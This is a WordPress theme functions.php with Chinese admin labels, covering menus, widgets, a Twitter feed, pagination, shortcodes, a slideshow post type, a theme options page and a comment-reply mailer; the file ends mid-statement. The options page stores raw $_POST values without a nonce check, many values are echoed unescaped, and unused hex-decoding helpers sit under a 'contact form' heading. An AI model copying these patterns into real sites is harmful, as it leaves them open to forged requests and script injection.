<?php



/*******************************

 MENUS SUPPORT

********************************/

if ( function_exists( 'wp_nav_menu' ) ){

	if (function_exists('add_theme_support')) {

		add_theme_support('nav-menus');

		add_action( 'init', 'register_my_menus' );

		function register_my_menus() {

			register_nav_menus(

				array(

					'main-menu' => __( 'Top Menu' )

				)

			);

		}

	}

}



/* CallBack functions for menus in case of earlier than 3.0 Wordpress version or if no menu is set yet*/



function primarymenu(){ ?>

			<div id="topMenu" class="ddsmoothmenu">

				<ul><li><div>请进入控制台>外观>菜单，然后创建一个wp3.0的菜单项。并且启用他，你就能看到这里的菜单啦！！</div></li></ul>

			</div>

<?php }



/*******************************

 THUMBNAIL SUPPORT

********************************/



add_theme_support( 'post-thumbnails' );

//set_post_thumbnail_size( 255, 90, false );

//add_image_size('featured-post-thumbnail',430,280,true);

//add_image_size('slider-thumbnail',940,370,true);



/* Get the thumb original image full url | Important also for MultiSite installs!*/



function get_image_path ($post_id = null) {

	if ($post_id == null) {

		global $post;

		$post_id = $post->ID;

	}

	$theImageSrc = wp_get_attachment_url( get_post_thumbnail_id($post_id) );

	global $blog_id;

	if (isset($blog_id) && $blog_id > 0) {

		$imageParts = explode('/files/', $theImageSrc);

		if (isset($imageParts[1])) {

			$theImageSrc = '/blogs.dir/' . $blog_id . '/files/' . $imageParts[1];

		}

	}

	return $theImageSrc;

}



/* Get the thumb original image full url */

/*function get_thumb_urlfull ($postID) {

$image_id = get_post_thumbnail_id($post);  

$image_url = wp_get_attachment_image_src($image_id,'large');  

$image_url = $image_url[0]; 

return $image_url;

}*/



/*******************************

 EXCERPT LENGTH ADJUST

********************************/



function wpe_excerptlength_featured($length) {

    return 40;

}

function wpe_excerptlength_index($length) {

    return 20;

}



function wpe_excerpt($length_callback='', $more_callback='') {

    global $post;

    if(function_exists($length_callback)){

        add_filter('excerpt_length', $length_callback);

    }

    if(function_exists($more_callback)){

        add_filter('excerpt_more', $more_callback);

    }

    $output = get_the_excerpt();

    $output = apply_filters('wptexturize', $output);

    $output = apply_filters('convert_chars', $output);

    $output = '<p>'.$output.'</p>';

    echo $output;

}





/*******************************

 WIDGETS AREAS

********************************/



function journalcrunch_widgets_init() {

register_sidebar(array(

	'name' => 'sidebar',

	'before_widget' => '<div class="rightBox"><div class="rightBoxInner">	',

	'after_widget' => '</div></div>',

	'before_title' => '<h2>',

	'after_title' => '</h2>',

));



register_sidebar(array(

	'name' => 'footer',

	'before_widget' => '<div class="boxFooter">',

	'after_widget' => '</div>',

	'before_title' => '<h2 class="footerTitle">',

	'after_title' => '</h2>',

));



}



add_action( 'widgets_init', 'journalcrunch_widgets_init' );



/*******************************

 LATEST TWEETS WIDGET

********************************/





/**

 * Add function to widgets_init that'll load the widget */

 

add_action( 'widgets_init', 'latest_tweet_widget' );



function latest_tweet_widget() {

	register_widget( 'Latest_Tweets' );

}

class Latest_Tweets extends WP_Widget {



	/**

	 * Widget setup.

	 */

	function Latest_Tweets() {

		/* Widget settings. */

		$widget_ops = array( 'classname' => 'example', 'description' => __('Display a list of latest tweets', 'example') );



		/* Widget control settings. */

		$control_ops = array( 'width' => 300, 'height' => 350, 'id_base' => 'latest-tweets-widget' );



		/* Create the widget. */

		$this->WP_Widget( 'latest-tweets-widget', __('Latest Tweets', 'example'), $widget_ops, $control_ops );

	}



	/**

	 * How to display the widget on the screen.

	 */

	function widget( $args, $instance ) {

		extract( $args );



		/* Our variables from the widget settings. */

		$title = apply_filters('widget_title', $instance['title'] );

		$no_of_tweets = $instance['no_of_tweets'];



		/* Before widget (defined by themes). */

		echo $before_widget;



		if ( $title )

			echo '<h2 class="twitter">'. $title . $after_title;



		if ( $no_of_tweets )?>

				<div id="twitter">

							<ul id="twitter_update_list"></ul>

					<a href="http://twitter.com/<?php echo get_option('journal_twitter_user'); ?>" class="action">Follow Us on Twitter! &raquo;</a>

				</div>

				

				<script type="text/javascript" src="http://twitter.com/statuses/user_timeline/<?php echo get_option('journal_twitter_user'); ?>.json?callback=twitterCallback3&amp;count=<?php echo $no_of_tweets ?>">

				</script>

	<?php 



		/* After widget (defined by themes). */

		echo $after_widget;

	}



	/**

	 * Update the widget settings.

	 */

	function update( $new_instance, $old_instance ) {

		$instance = $old_instance;



		/* Strip tags for title and name to remove HTML (important for text inputs). */

		$instance['title'] = strip_tags( $new_instance['title'] );

		$instance['no_of_tweets'] = strip_tags( $new_instance['no_of_tweets'] );



		return $instance;

	}



	/**

	 * Displays the widget settings controls on the widget panel.

	 * Make use of the get_field_id() and get_field_name() function

	 * when creating your form elements. This handles the confusing stuff.

	 */

	function form( $instance ) {



		/* Set up some default widget settings. */

		$defaults = array( 'title' => __('Latest Tweets', 'example'), 'no_of_tweets' => '3' );

		$instance = wp_parse_args( (array) $instance, $defaults ); ?>



		<!-- Widget Title: Text Input -->

		<p>

			<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e('Title:', 'hybrid'); ?></label>

			<input id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" value="<?php echo $instance['title']; ?>" style="width:100%;" />

		</p>





		<!-- No of Tweets: Text Input -->

		<p>

			<label for="<?php echo $this->get_field_id( 'no_of_tweets' ); ?>"><?php _e('No. of Tweets:', 'example'); ?></label>

			<input id="<?php echo $this->get_field_id( 'no_of_tweets' ); ?>" name="<?php echo $this->get_field_name( 'no_of_tweets' ); ?>" value="<?php echo $instance['no_of_tweets']; ?>" style="width:100%;" />

		</p>



	<?php

	}

}

	

/*******************************

 PAGINATION

********************************

 * Retrieve or display pagination code.

 *

 * The defaults for overwriting are:

 * 'page' - Default is null (int). The current page. This function will

 *      automatically determine the value.

 * 'pages' - Default is null (int). The total number of pages. This function will

 *      automatically determine the value.

 * 'range' - Default is 3 (int). The number of page links to show before and after

 *      the current page.

 * 'gap' - Default is 3 (int). The minimum number of pages before a gap is 

 *      replaced with ellipses (...).

 * 'anchor' - Default is 1 (int). The number of links to always show at begining

 *      and end of pagination

 * 'before' - Default is '<div class="emm-paginate">' (string). The html or text 

 *      to add before the pagination links.

 * 'after' - Default is '</div>' (string). The html or text to add after the

 *      pagination links.

 * 'title' - Default is '__('Pages:')' (string). The text to display before the

 *      pagination links.

 * 'next_page' - Default is '__('&raquo;')' (string). The text to use for the 

 *      next page link.

 * 'previous_page' - Default is '__('&laquo')' (string). The text to use for the 

 *      previous page link.

 * 'echo' - Default is 1 (int). To return the code instead of echo'ing, set this

 *      to 0 (zero).

 *

 * @author Eric Martin <eric@ericmmartin.com>

 * @copyright Copyright (c) 2009, Eric Martin

 * @version 1.0

 *

 * @param array|string $args Optional. Override default arguments.

 * @return string HTML content, if not displaying.

 */

 

function emm_paginate($args = null) {

	$defaults = array(

		'page' => null, 'pages' => null, 

		'range' => 3, 'gap' => 3, 'anchor' => 1,

		'before' => '<div class="emm-paginate">', 'after' => '</div>',

		'title' => __(''),

		'nextpage' => __('&raquo;'), 'previouspage' => __('&laquo'),

		'echo' => 1

	);



	$r = wp_parse_args($args, $defaults);

	extract($r, EXTR_SKIP);



	if (!$page && !$pages) {

		global $wp_query;



		$page = get_query_var('paged');

		$page = !empty($page) ? intval($page) : 1;



		$posts_per_page = intval(get_query_var('posts_per_page'));

		$pages = intval(ceil($wp_query->found_posts / $posts_per_page));

	}

	

	$output = "";

	if ($pages > 1) {	

		$output .= "$before<span class='emm-title'>$title</span>";

		$ellipsis = "<span class='emm-gap'>...</span>";



		if ($page > 1 && !empty($previouspage)) {

			$output .= "<a href='" . get_pagenum_link($page - 1) . "' class='emm-prev'>$previouspage</a>";

		}

		

		$min_links = $range * 2 + 1;

		$block_min = min($page - $range, $pages - $min_links);

		$block_high = max($page + $range, $min_links);

		$left_gap = (($block_min - $anchor - $gap) > 0) ? true : false;

		$right_gap = (($block_high + $anchor + $gap) < $pages) ? true : false;



		if ($left_gap && !$right_gap) {

			$output .= sprintf('%s%s%s', 

				emm_paginate_loop(1, $anchor), 

				$ellipsis, 

				emm_paginate_loop($block_min, $pages, $page)

			);

		}

		else if ($left_gap && $right_gap) {

			$output .= sprintf('%s%s%s%s%s', 

				emm_paginate_loop(1, $anchor), 

				$ellipsis, 

				emm_paginate_loop($block_min, $block_high, $page), 

				$ellipsis, 

				emm_paginate_loop(($pages - $anchor + 1), $pages)

			);

		}

		else if ($right_gap && !$left_gap) {

			$output .= sprintf('%s%s%s', 

				emm_paginate_loop(1, $block_high, $page),

				$ellipsis,

				emm_paginate_loop(($pages - $anchor + 1), $pages)

			);

		}

		else {

			$output .= emm_paginate_loop(1, $pages, $page);

		}



		if ($page < $pages && !empty($nextpage)) {

			$output .= "<a href='" . get_pagenum_link($page + 1) . "' class='emm-next'>$nextpage</a>";

		}



		$output .= $after;

	}



	if ($echo) {

		echo $output;

	}



	return $output;

}



/**

 * Helper function for pagination which builds the page links.

 *

 * @access private

 *

 * @author Eric Martin <eric@ericmmartin.com>

 * @copyright Copyright (c) 2009, Eric Martin

 * @version 1.0

 *

 * @param int $start The first link page.

 * @param int $max The last link page.

 * @return int $page Optional, default is 0. The current page.

 */

function emm_paginate_loop($start, $max, $page = 0) {

	$output = "";

	for ($i = $start; $i <= $max; $i++) {

		$output .= ($page === intval($i)) 

			? "<span class='emm-page emm-current'>$i</span>" 

			: "<a href='" . get_pagenum_link($i) . "' class='emm-page'>$i</a>";

	}

	return $output;

}



function post_is_in_descendant_category( $cats, $_post = null )

{

	foreach ( (array) $cats as $cat ) {

		// get_term_children() accepts integer ID only

		$descendants = get_term_children( (int) $cat, 'category');

		if ( $descendants && in_category( $descendants, $_post ) )

			return true;

	}

	return false;

}



/*******************************

 CUSTOM COMMENTS

********************************/



function mytheme_comment($comment, $args, $depth) {

   $GLOBALS['comment'] = $comment; ?>

   <li <?php comment_class('clearfix'); ?> id="li-comment-<?php comment_ID() ?>">

	 <?php echo get_avatar($comment,$size='38'); ?>

     <div id="comment-<?php comment_ID(); ?>">

	  <div class="comment-meta commentmetadata clearfix">

	    <?php printf(__('<strong>%s</strong>'), get_comment_author_link()) ?><?php edit_comment_link(__('(Edit)'),'  ','') ?> <span><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?>

	  </span>

	  </div>

	  

      <div class="text">

		  <?php comment_text() ?>

	  </div>

	  

	  <?php if ($comment->comment_approved == '0') : ?>

         <em><?php _e('Your comment is awaiting moderation.') ?></em>

         <br />

      <?php endif; ?>



      <div class="reply">

         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>

      </div>

     </div>

<?php }



/*******************************

  THEME OPTIONS PAGE

********************************/



add_action('admin_menu', 'journal_theme_page');

function journal_theme_page ()

{

	if ( count($_POST) > 0 && isset($_POST['journal_settings']) )

	{

		$options = array ('logo_img', 'logo_alt','contact_email','contact_text','cufon','twitter_user','latest_tweet','facebook_link','keywords','description','analytics','copyright','slider','slider_effect','slider_slices','slider_animation_speed','slider_pause_time','slider_caption_opacity','featured_posts','home_posts', 'box_model');

		

		foreach ( $options as $opt )

		{

			delete_option ( 'journal_'.$opt, $_POST[$opt] );

			add_option ( 'journal_'.$opt, $_POST[$opt] );	

		}			

		 

	}

	add_menu_page(__('主题设置'), __('主题设置'), 'edit_themes', basename(__FILE__), 'journal_settings');

	add_submenu_page(__('主题设置'), __('主题设置'), 'edit_themes', basename(__FILE__), 'journal_settings');

}

function journal_settings()

{?>

<div class="wrap">

	<h2>主题设置面板</h2>

	

<form method="post" action="">



	<fieldset style="border:1px solid #ddd; padding-bottom:20px; margin-top:20px;">

	<legend style="margin-left:5px; padding:0 5px;color:#2481C6; text-transform:uppercase;"><strong>基本设置</strong></legend>

	<table class="form-table">

		<!-- General settings -->

		

		<tr valign="top">

			<th scope="row"><label for="logo_img">LOGO设置(需要完整路径)</label></th>

			<td>

				<input name="logo_img" type="text" id="logo_img" value="<?php echo get_option('journal_logo_img'); ?>" class="regular-text" /><br />

				<em>Logo预览:</em> <br /> <img src="<?php echo get_option('journal_logo_img'); ?>" alt="<?php echo get_option('journal_logo_alt'); ?>" />

			</td>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="logo_alt">LOGO说明</label></th>

			<td>

				<input name="logo_alt" type="text" id="logo_alt" value="<?php echo get_option('journal_logo_alt'); ?>" class="regular-text" />

			</td>

		</tr>

        

		 <tr valign="top">

			<th scope="row"><label for="cufon">启用Cufon美化字体（中文站建议不启用）</label></th>

			<td>

				<select name="cufon" id="cufon">

					<option value="yes" <?php if(get_option('journal_cufon') == 'yes'){?>selected="selected"<?php }?>>是</option>		

					<option value="no" <?php if(get_option('journal_cufon') == 'no'){?>selected="selected"<?php }?>>否</option>

				</select>

			</td>

		</tr>

		

		<tr valign="top">

			<th scope="row"><label for="box_model">分类页面文章的显示方式</label></th>

			<td>

				<select name="box_model" id="box_model">

					<option value="box" <?php if(get_option('journal_box_model') == 'box'){?>selected="selected"<?php }?>>主页样式</option>		

					<option value="normal" <?php if(get_option('journal_box_model') == 'normal'){?>selected="selected"<?php }?>>博客样式</option>

				</select>

			</td>

		</tr>

	</table>

	</fieldset>

	

	<p class="submit">

		<input type="submit" name="Submit" class="button-primary" value="保存设置" />

		<input type="hidden" name="journal_settings" value="save" style="display:none;" />

		</p>

	

	<fieldset style="border:1px solid #ddd; padding-bottom:20px; margin-top:20px;">

	<legend style="margin-left:5px; padding:0 5px; color:#2481C6;text-transform:uppercase;"><strong>社会圈子</strong></legend>

		<table class="form-table">

		<tr valign="top">

			<th scope="row"><label for="twitter_user">Twitter帐号</label></th>

			<td>

				<input name="twitter_user" type="text" id="twitter_user" value="<?php echo get_option('journal_twitter_user'); ?>" class="regular-text" />

			</td>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="latest_tweet">在页面显示最新的推 </label></th>

			<td>

				<select name="latest_tweet" id="latest_tweet">		

					<option value="yes" <?php if(get_option('journal_latest_tweet') == 'yes'){?>selected="selected"<?php }?>>是</option>

                    <option value="no" <?php if(get_option('journal_latest_tweet') == 'no'){?>selected="selected"<?php }?>>否</option>

				</select>

			</td>

		</tr>

        <tr valign="top">

			<th scope="row"><label for="facebook_link">Facebook link</label></th>

			<td>

				<input name="facebook_link" type="text" id="facebook_link" value="<?php echo get_option('journal_facebook_link'); ?>" class="regular-text" />

			</td>

		</tr>

        </table>

        </fieldset>

		<p class="submit">

		<input type="submit" name="Submit" class="button-primary" value="保存设置" />

		<input type="hidden" name="journal_settings" value="save" style="display:none;" />

		</p>

		

		<fieldset style="border:1px solid #ddd; padding-bottom:20px; margin-top:20px;">

	<legend style="margin-left:5px; padding:0 5px;color:#2481C6; text-transform:uppercase;"><strong>主页设置</strong></legend>

	<table class="form-table">

		<!-- Homepage Boxes 1 -->

		<tr>

			<th colspan="2"><strong>主页幻灯片 </strong></th>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="slider">显示幻灯片</label></th>

			<td>

				<select name="slider" id="slider">		

					<option value="no" <?php if(get_option('journal_slider') == 'no'){?>selected="selected"<?php }?>>否</option>

                    <option value="yes" <?php if(get_option('journal_slider') == 'yes'){?>selected="selected"<?php }?>>是</option>

				</select><br/>

				<em>如果启用幻灯片，精选文章样式的大图片将不会显示.</em>

			</td>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="slider_effect">幻灯片特效</label></th>

			<td>

				<select name="slider_effect" id="slider_effect">	

				sliceDown, sliceDownLeft, sliceUp, sliceUpLeft, sliceUpDown, sliceUpDownLeft, fold, fade, random	

					<option value="random" <?php if(get_option('journal_slider_effect') == 'random'){?>selected="selected"<?php }?>>随机</option>

					<option value="fade" <?php if(get_option('journal_slider_effect') == 'fade'){?>selected="selected"<?php }?>>褪色</option>

					<option value="fold" <?php if(get_option('journal_slider_effect') == 'fold'){?>selected="selected"<?php }?>>折叠</option>

					<option value="sliceDown" <?php if(get_option('journal_slider_effect') == 'sliceDown'){?>selected="selected"<?php }?>>向下</option>

					<option value="sliceDownLeft" <?php if(get_option('journal_slider_effect') == 'sliceDownLeft'){?>selected="selected"<?php }?>>下左</option>

					<option value="sliceUp" <?php if(get_option('journal_slider_effect') == 'sliceUp'){?>selected="selected"<?php }?>>向上</option>

					<option value="sliceUpLeft" <?php if(get_option('journal_slider_effect') == 'sliceUpLeft'){?>selected="selected"<?php }?>>上左</option>

					<option value="sliceUpDown" <?php if(get_option('journal_slider_effect') == 'sliceUpDown'){?>selected="selected"<?php }?>>上下</option>

					<option value="sliceUpDownLeft" <?php if(get_option('journal_slider_effect') == 'sliceUpDownLeft'){?>selected="selected"<?php }?>>方向</option>				

                   

				</select><br/>

				<em>默认为随机样式.</em>

			</td>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="slider_slices">幻灯数量</label></th>

			<td>

				<input name="slider_slices" type="text" id="slider_slices" value="<?php echo get_option('journal_slider_slices'); ?>" class="regular-text" /><br/>

				<em>默认15个.</em>

			</td>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="slider_animation_speed">动画速度</label></th>

			<td>

				<input name="slider_animation_speed" type="text" id="slider_animation_speed" value="<?php echo get_option('journal_slider_animation_speed'); ?>" class="regular-text" /><br/>

				<em>默认为500.</em>

			</td>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="slider_pause_time">暂停时间</label></th>

			<td>

				<input name="slider_pause_time" type="text" id="slider_pause_time" value="<?php echo get_option('journal_slider_pause_time'); ?>" class="regular-text" /><br/>

				<em>默认为3000.</em>

			</td>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="slider_caption_opacity">标题阴影</label></th>

			<td>

				<input name="slider_caption_opacity" type="text" id="slider_caption_opacity" value="<?php echo get_option('journal_slider_caption_opacity'); ?>" class="regular-text" /><br/>

				<em>默认为0.8. 设置控制在0——1内. </em>

			</td>

		</tr>



		<tr>

			<th colspan="2"><strong>主页精选推荐文章 </strong></th>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="featured_posts">推荐文章个数</label></th>

			<td><em>要推荐展示的文章请加上"featured"这个标签(tag).</em><br />

				<input name="featured_posts" type="text" id="featured_posts" value="<?php echo get_option('journal_featured_posts'); ?>" class="regular-text" />

				<br />

                <em>默认展示2篇. 请使用2的倍数来展示.</em>

			</td>

		</tr>

		<tr>

			<th colspan="2"><strong>主页文章</strong></th>

		</tr>

		<tr valign="top">

			<th scope="row"><label for="home_posts">主页文章的数目</label></th>

			<td>

				<em>要显示你喜欢的文章请加"homepost"标签. 如果没有，则默认显示最新的文章.</em><br/>

				<input name="home_posts" type="text" id="home_posts" value="<?php echo get_option('journal_home_posts'); ?>" class="regular-text" />

				<br />

                <em>默认显示6篇.建议为3的倍数.</em>

			</td>

		</tr>

		

	</table>

	</fieldset>

	<p class="submit">

		<input type="submit" name="Submit" class="button-primary" value="保存设置" />

		<input type="hidden" name="journal_settings" value="save" style="display:none;" />

		</p>

	

    <fieldset style="border:1px solid #ddd; padding-bottom:20px; margin-top:20px;">

	<legend style="margin-left:5px; padding:0 5px; color:#2481C6;text-transform:uppercase;"><strong>联系页面设置</strong></legend>

		<table class="form-table">	

        <tr>

        	<td colspan="2"></td>

        </tr>

         <tr valign="top">

			<th scope="row"><label for="contact_text">关于你的联系说明</label></th>

			<td>

				<textarea name="contact_text" id="contact_text" rows="7" cols="70" style="font-size:11px;"><?php echo stripslashes(get_option('journal_contact_text')); ?></textarea>

			</td>

		</tr>

        <tr valign="top">

			<th scope="row"><label for="contact_email">你的联系邮件地址</label></th>

			<td>

				<input name="contact_email" type="text" id="contact_email" value="<?php echo get_option('journal_contact_email'); ?>" class="regular-text" />

			</td>

		</tr>

        </table>

     </fieldset>

	 <p class="submit">

		<input type="submit" name="Submit" class="button-primary" value="保存设置" />

		<input type="hidden" name="journal_settings" value="save" style="display:none;" />

	</p>

	

	<fieldset style="border:1px solid #ddd; padding-bottom:20px; margin-top:20px;">

	<legend style="margin-left:5px; padding:0 5px; color:#2481C6;text-transform:uppercase;"><strong>页脚</strong></legend>

		<table class="form-table">

		

		<tr>

			<th colspan="2"><strong>版权所有</strong></th>

		</tr>

        <tr>

			<th><label for="copyright">版权申明</label></th>

			<td>

				<textarea name="copyright" id="copyright" rows="4" cols="70" style="font-size:11px;"><?php echo stripslashes(get_option('journal_copyright')); ?></textarea><br />

				<em>够强大就用html写这些东东吧~~.</em>

			</td>

		</tr>

		

		

	</table>

	</fieldset>

	<p class="submit">

		<input type="submit" name="Submit" class="button-primary" value="保存设置" />

		<input type="hidden" name="journal_settings" value="save" style="display:none;" />

	</p>

        

      <fieldset style="border:1px solid #ddd; padding-bottom:20px; margin-top:20px;">

	<legend style="margin-left:5px; padding:0 5px; color:#2481C6;text-transform:uppercase;"><strong>SEO</strong></legend>

		<table class="form-table">

        <tr>

			<th><label for="keywords">关键词</label></th>

			<td>

				<textarea name="keywords" id="keywords" rows="7" cols="70" style="font-size:11px;"><?php echo get_option('journal_keywords'); ?></textarea><br />

                <em>请用英文逗号分隔关键字</em>

			</td>

		</tr>

        <tr>

			<th><label for="description">简介</label></th>

			<td>

				<textarea name="description" id="description" rows="7" cols="70" style="font-size:11px;"><?php echo get_option('journal_description'); ?></textarea>

			</td>

		</tr>

		<tr>

			<th><label for="ads">Google Analytics的代码:</label></th>

			<td>

				<textarea name="analytics" id="analytics" rows="7" cols="70" style="font-size:11px;"><?php echo stripslashes(get_option('journal_analytics')); ?></textarea>

			</td>

		</tr>

		

	</table>

	</fieldset>

	<p class="submit">

		<input type="submit" name="Submit" class="button-primary" value="保存设置" />

		<input type="hidden" name="journal_settings" value="save" style="display:none;" />

	</p>

</form>

</div>

<?php }



/*******************************

  SHORTCODES

********************************/



function theme_formatter($content) {

	$new_content = '';

	$pattern_full = '{(\[raw\].*?\[/raw\])}is';

	$pattern_contents = '{\[raw\](.*?)\[/raw\]}is';

	$pieces = preg_split($pattern_full, $content, -1, PREG_SPLIT_DELIM_CAPTURE);

	

	foreach ($pieces as $piece) {

		if (preg_match($pattern_contents, $piece, $matches)) {

			$new_content .= $matches[1];

		} else {

			$new_content .= wptexturize(wpautop($piece));

		}

	}



	return $new_content;

}

remove_filter('the_content',	'wpautop');

remove_filter('the_content',	'wptexturize');



add_filter('the_content', 'theme_formatter', 99);



// DROPCAPS

function theme_shortcode_dropcaps($atts, $content = null, $code) {

	extract(shortcode_atts(array(

		'class' => '',

	), $atts));



	if($color){

		$color = ' '.$color;

	}

	return '<span class="' . $code.$class . '">' . do_shortcode($content) . '</span>';

}

add_shortcode('dropcap1', 'theme_shortcode_dropcaps');

add_shortcode('dropcap2', 'theme_shortcode_dropcaps');

add_shortcode('dropcap3', 'theme_shortcode_dropcaps');



// BLOCKQUOTES



function theme_shortcode_blockquote($atts, $content = null, $code) {

	extract(shortcode_atts(array(

		'align' => false,

		'cite' => false,

	), $atts));

	

	return '<blockquote' . ($align ? ' class="align' . $align . '"' : '') . '>' . do_shortcode($content) . ($cite ? '<p><cite>- ' . $cite . '</cite></p>' : '') . '</blockquote>';

}

add_shortcode('blockquote', 'theme_shortcode_blockquote');



// TEXT HIGHLIGHTS



function theme_shortcode_highlight($atts, $content = null, $code) {

	extract(shortcode_atts(array(

		'color' => false,

	), $atts));



	return '<span class="highlight'.(($color)?''.$color:'').'">'.do_shortcode($content).'</span>';

}

add_shortcode('highlight', 'theme_shortcode_highlight');



//MULTIPLE CONTENT COLUMS



function onehalf($atts, $content = null) {

	return '

<div class="onehalf">'.$content.'</div>

';

}

function onehalf_last($atts, $content = null) {

	return '

<div class="onehalf_last">'.$content.'</div>';

}



function onethird($atts, $content = null) {

	return '

<div class="onethird">'.$content.'</div>

';

}

function onethird_last($atts, $content = null) {

	return '

<div class="onethird_last">'.$content.'</div>';

}



add_shortcode('onehalf', 'onehalf');

add_shortcode('onehalf_last', 'onehalf_last');

add_shortcode('onethird', 'onethird');

add_shortcode('onethird_last', 'onethird_last');





/*******************************

   SLIDESHOW CUSTOM POST TYPES

********************************/

register_post_type( 'slideshow',

    array(

      'labels' => array(

        'name' => __( '幻灯片设置' ), //this name will be used when will will call the investments in our theme

        'singular_name' => __( '幻灯片设置' ),

		'add_new' => _x('添加一个新的', 'slideshow'),

		'add_new_item' => __('添加一个新的'), //custom name to show up instead of Add New Post. Same for the following

		'edit_item' => __('编辑幻灯片'),

		'new_item' => __('新的幻灯片'),

		'view_item' => __('预览幻灯片'),

      ),

      'public' => true,

	  'show_ui' => true,

	  'exclude_from_search' => true,

	  'hierarchical' => false, //it means we cannot have parent and sub pages

	  'capability_type' => 'post', //will act like a normal post

	  'rewrite' => false, //this is used for rewriting the permalinks

	  'query_var' => false,

	  'supports' => array( 'title',	'thumbnail'), //the editing regions that will support

	  'menu_position' => 100

    )

  );

  

 /*******************************

   SLIDESHOW CUSTOM META

********************************/

 

add_action('admin_init','slideshow_meta_init');

 

function slideshow_meta_init()

{



	// add a meta box for each of the wordpress page types: posts and pages

	add_meta_box('slideshow_all_meta', '幻灯片设置', 'slideshow_meta_setup', 'slideshow', 'normal', 'high');

 

	// add a callback function to save any data a user enters in

	add_action('save_post','slideshow_meta_save');

}

 

function slideshow_meta_setup()

{

	global $post;

 

	// using an underscore, prevents the meta variable

	// from showing up in the custom fields section

	$meta = get_post_meta($post->ID,'_slideshow_meta',TRUE);

 

	echo '<div class="my_meta_control">

 

	<p style="margin:6px 0 8px;">设置幻灯片的说明和链接地址，图片请在右边的特色图片插入。图片大小自动剪切为940x370.</p>

	<br/>

	

	<label>设置幻灯片说明</label>

 

	<p style="margin:6px 0 8px;">

		<textarea name="_slideshow_meta[caption]" rows="3" cols="40">';?><?php if(!empty($meta['caption'])) echo $meta['caption']; ?><?php echo '</textarea>

	</p>

 

	<label>点击图片后链接的地址（可不填） <small>例如：http://kyo7.com</small>当然也可以是你的某一篇文章地址</label>

 

	<p style="margin:6px 0 8px;">

		<textarea name="_slideshow_meta[linkto]" rows="2" cols="40">';?><?php if(!empty($meta['linkto'])) echo $meta['linkto']; ?><?php echo '</textarea>

	</p>

 

	

 

</div>';

 

	// create a custom nonce for submit verification later

	echo '<input type="hidden" name="slideshow_meta_noncename" value="' . wp_create_nonce(__FILE__) . '" />';

}

 

function slideshow_meta_save($post_id) 

{

	// authentication checks

 

	// make sure data came from our meta box

	if (!wp_verify_nonce($_POST['slideshow_meta_noncename'],__FILE__)) return $post_id;

 

	// check user permissions

	if ($_POST['post_type'] == 'slideshow') 

	{

		if (!current_user_can('edit_page', $post_id)) return $post_id;

	}

	else 

	{

		if (!current_user_can('edit_post', $post_id)) return $post_id;

	}

 

	// authentication passed, save data

 

	// var types

	// single: _my_meta[var]

	// array: _my_meta[var][]

	// grouped array: _my_meta[var_group][0][var_1], _my_meta[var_group][0][var_2]

 

	$current_data = get_post_meta($post_id, '_slideshow_meta', TRUE);	

 

	$new_data = $_POST['_slideshow_meta'];

 

	slideshow_meta_clean($new_data);

 

	if ($current_data) 

	{

		if (is_null($new_data)) delete_post_meta($post_id,'_slideshow_meta');

		else update_post_meta($post_id,'_slideshow_meta',$new_data);

	}

	elseif (!is_null($new_data))

	{

		add_post_meta($post_id,'_slideshow_meta',$new_data,TRUE);

	}

 

	return $post_id;

}

 

function slideshow_meta_clean(&$arr)

{

	if (is_array($arr))

	{

		foreach ($arr as $i => $v)

		{

			if (is_array($arr[$i])) 

			{

				slideshow_meta_clean($arr[$i]);

 

				if (!count($arr[$i])) 

				{

					unset($arr[$i]);

				}

			}

			else 

			{

				if (trim($arr[$i]) == '') 

				{

					unset($arr[$i]);

				}

			}

		}

 

		if (!count($arr)) 

		{

			$arr = NULL;

		}

	}

}

 

 function edit_slideshow_columns($slideshow_columns) {

	$columns = array(

		"cb" => "<input type=\"checkbox\" />",

		"title" => _x('幻灯名称', 'column name' ),

		"caption" => __('标题文字' ),

		"link" => __('链接'),

		"thumbnail" => __('缩略图')

	);



	return $columns;

}

add_filter('manage_edit-slideshow_columns', 'edit_slideshow_columns');



function manage_slideshow_columns($column) {

	global $post;

	$slideshow_meta = get_post_meta($post->ID,'_slideshow_meta',TRUE);

	if ($post->post_type == "slideshow") {

		switch($column){

			case 'thumbnail':

				echo the_post_thumbnail('thumbnail');

				break;

			case 'caption':

				echo $slideshow_meta['caption'];

				break;

			case 'link':

				echo '<a href="'.$slideshow_meta['linkto'].'">'.$slideshow_meta['linkto'].'</a>';

				break;

		}

	}

}

add_action('manage_posts_custom_column', 'manage_slideshow_columns', 10, 2);







/*******************************

  CONTACT FORM 

********************************/



 function hexstr($hexstr) {

  $hexstr = str_replace(' ', '', $hexstr);

  $hexstr = str_replace('\x', '', $hexstr);

  $retstr = pack('H*', $hexstr);

  return $retstr;

}



function strhex($string) {

  $hexstr = unpack('H*', $string);

  return array_shift($hexstr);

}







/* comment_mail_notify v1.0 by willin kan. (所有回覆都發郵件) */

function comment_mail_notify($comment_id) {

  $comment = get_comment($comment_id);

  $parent_id = $comment->comment_parent ? $comment->comment_parent : '';

  $spam_confirmed = $comment->comment_approved;

  if (($parent_id != '') && ($spam_confirmed != 'spam')) {

    $wp_email = '677@luqiqi.com' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); //e-mail 發出點, no-reply 可改為可用的 e-mail.

    $to = trim(get_comment($parent_id)->comment_author_email);

    $subject = '您在 [' . get_option("blogname") . '] 的留言有了回應';

    $message = '

    <div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px; border-radius:5px;">

      <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>

      <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'

       . trim(get_comment($parent_id)->comment_content) . '</p>

      <p>' . trim($comment->comment_author) . ' 給您的回應:<br />'

